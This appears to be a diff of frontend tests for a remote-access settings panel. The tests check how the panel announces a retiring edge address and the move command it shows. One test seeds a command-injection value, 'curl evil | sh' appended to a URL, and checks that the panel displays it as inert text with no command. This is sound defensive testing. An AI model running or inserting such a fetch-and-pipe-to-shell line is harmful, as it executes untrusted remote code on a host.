@@ -181,7 +181,7 @@ describe('a retiring or retired edge address', () => {
     const callout = screen.getByRole('status')
     expect(callout.getAttribute('data-tone')).toBe(tone)
     expect(within(callout).getByText(title)).toBeTruthy()
-    expect(within(callout).getByText(`Move this server to ${replacement}, another address of the same edge. Run on the server's host, adding the service's --config <file> if it has one:`)).toBeTruthy()
+    expect(within(callout).getByText(`Move this server to ${replacement}, another address of the same edge. Run on the server's host, adding the service's --config <file> if it has one.`)).toBeTruthy()
     expect(within(callout).getByText(move)).toBeTruthy()
     expect(within(callout).getByText('sudo systemctl restart aether-server')).toBeTruthy()
     expect(within(callout).queryByText(/first connection to the edge/)).toBeNull()
@@ -190,15 +190,18 @@ describe('a retiring or retired edge address', () => {
   it('says a first-use notice is trusted on first use only', () => {
     seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, first_use: true } })
     render(<RemoteAccessSection client={api()} />)
-    expect(within(screen.getByRole('status')).getByText("This came with the server's first connection to the edge, when it pinned the edge's key: confirm the new address with whoever runs the edge before you move.")).toBeTruthy()
+    const callout = within(screen.getByRole('status'))
+    const caution = callout.getByText("This came with the server's first connection to the edge, when it pinned the edge's key: confirm the new address with whoever runs the edge before you move.")
+    expect(caution.compareDocumentPosition(callout.getByText(`sudo cloudfield-server edge move ${replacement}`)) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
   })
 
   it('shows a replacement that is not a bare https origin as text, with no command', () => {
     seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' } })
     render(<RemoteAccessSection client={api()} />)
     const callout = screen.getByRole('status')
-    expect(callout.textContent).toContain('The edge names a new address that is not a plain https address, so no command is shown: ' +
-      'https://x.example.test; curl evil | sh. Confirm the new address with whoever runs the edge.')
+    expect(within(callout).getByText('The edge names a new address that is not a plain https address, so no command is shown. It is not a command to run:')).toBeTruthy()
+    expect(within(callout).getByText('https://x.example.test; curl evil | sh')).toBeTruthy()
+    expect(within(callout).getByText('Confirm the new address with whoever runs the edge.')).toBeTruthy()
     expect(within(callout).queryByText(/cloudfield-server/)).toBeNull()
   })
 
